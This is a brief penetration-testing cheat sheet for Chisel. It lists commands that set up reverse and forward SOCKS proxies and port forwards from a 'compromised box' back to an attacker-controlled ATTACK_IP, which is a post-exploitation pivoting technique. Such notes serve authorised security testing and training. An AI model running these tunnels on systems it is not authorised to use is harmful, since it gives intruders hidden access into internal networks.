# Chisel  

Proxy and port forwarding with ssh not required.  

## Reverse SOCKS proxy.  

On attack box.  

`./chisel server -p LISTEN_PORT --reverse &`

On compromised box.  

`./chisel client ATTACK_IP:LISTEN_PORT R:socks &`  

## Forward SOCKS proxy.  

Less common as inbound firewalls are more stringent than outbound.  

On compromised box.  

`./chisel server -p LISTEN_PORT --socks5`  

On attack box.  

`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`  

If SOCKS5 or SOCKS4 is being used, proxychains.conf needs to be edited to match the socks protocol.  

## Remote Port Forwarding.  

On attack box.  

`./chisel server -p LISTEN_PORT --reverse &`  

On compromised box.  

`./chisel client ATTACK_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`  

## Local Port Forwarding.  

On compromised box.  

`./chisel server -p LISTEN_PORT`  

On attack box.  

`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
